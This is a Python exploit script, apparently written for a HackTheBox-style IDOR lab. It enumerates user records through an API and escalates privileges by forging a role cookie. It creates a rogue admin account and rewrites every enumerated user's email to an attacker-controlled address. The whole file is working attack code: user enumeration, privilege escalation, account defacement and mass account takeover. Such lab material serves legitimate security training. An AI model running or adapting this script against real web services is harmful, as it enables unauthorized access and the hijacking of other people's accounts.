import argparse
import requests
import json
from colorama import Style, Fore

url = ""
target_email = "flag@idor.htb"
new_user_uid = 1337
headers = {"Content-Type": "application/json"}

class User:
    def __init__(
        self,
        uid=None,
        uuid=None,
        role=None,
        full_name=None,
        email=None,
        about=None,
        json_data=None,
    ):
        if json_data:
            self.json_data = json_data
            self.uid = json_data.get("uid")
            self.uuid = json_data.get("uuid")
            self.role = json_data.get("role")
            self.full_name = json_data.get("full_name")
            self.email = json_data.get("email")
            self.about = json_data.get("about")
        else:
            self.uid = uid
            self.uuid = uuid
            self.role = role
            self.full_name = full_name
            self.email = email
            self.about = about

    def json(self):  # noqa: F811
        return {
            "uid": self.uid,
            "uuid": self.uuid,
            "role": self.role,
            "full_name": self.full_name,
            "email": self.email,
            "about": self.about,
        }
    def print(self):
        print(f"{'-' * 20}\n")
        print(self.json())
        print(f"{'-' * 20}\n")


def get_user(uid):
    url_modified = url + str(uid)
    try:
        response = requests.get(url_modified)
        if not response.text.strip():
            return None
        return User(json_data=response.json())
    except requests.RequestException as e:
        print(f"{Fore.RED}[-] An error occured: {e}{Style.RESET_ALL}")
        return None


def modify_current_user(user, admin_role):
    user.role = admin_role
    cookie = {"role": admin_role}
    try:
        response = requests.put(url + str(user.uid), json=user.json(), cookies=cookie, headers=headers)
        body = response.text.strip()
        if response.text != "1":
            print(
                f"{Fore.RED}[-] An error occured while modifying user's role: {response.text}{Style.RESET_ALL}"
            )
            return False

        print(f"[+]{Fore.GREEN}[+] Priveleges elevated successfully{Style.RESET_ALL}")
        return True
    except requests.RequestException as e:
        print(f"{Fore.RED}[-] An error occured: {e}{Style.RESET_ALL}")
        return False

def create_new_user(admin_role):
    modified_url = url + str(new_user_uid) 
    new_user = User(
        uid=new_user_uid,
        uuid="1337888b67c748df7efba008e7c2f9d2",
        role=admin_role,
        full_name="Viv4ldi Rocks",
        email=target_email,
        about="You have been Pwned by viv4ldi! <Arch4ea Rules>"
    )
    cookie = {"role": admin_role}
    try:
        response = requests.post(modified_url, json=new_user.json(), cookies=cookie, headers=headers)
    except requests.RequestException as e:
        print(f"{Fore.RED}[-] An error occured: {e}{Style.RESET_ALL}")
        return False

def mass_inject(users, admin_role):
    cookie = {"role": admin_role} 
    for user in users:
        modified_url = url + str(user.uid)
        user.email = target_email
        try:
            response = requests.post(modified_url, json=user.json(), cookies=cookie, headers=headers)
        except requests.RequestException as e:
            print(f"{Fore.RED}[-] An error occured: {e}{Style.RESET_ALL}")
            continue

def main():
    global url

    parser = argparse.ArgumentParser(description="Exploit IDOR vulnerability")
    parser.add_argument(
        "-u",
        "--url",
        required=True,
        help="Target URL with base included for the exploit",
    )

    url = parser.parse_args().url
    if url[-1] != "/":
        url = url + "/"

    users = []
    current_user = get_user(1)
    current_user.print()
    users.append(current_user)
    admin_role = ""
    for i in range(2, 31):
        user = get_user(i)
        if user:
            user.print()
            users.append(user)
            if user.role and "admin" in user.role.lower():
                admin_role = user.role
                print(
                    f"{Fore.GREEN}[+] Found Admin Role: {admin_role}{Style.RESET_ALL}"
                )
    modify_current_user(current_user, admin_role)
    create_new_user(admin_role)
    mass_inject(users, admin_role)
    

if __name__ == "__main__":
    main()
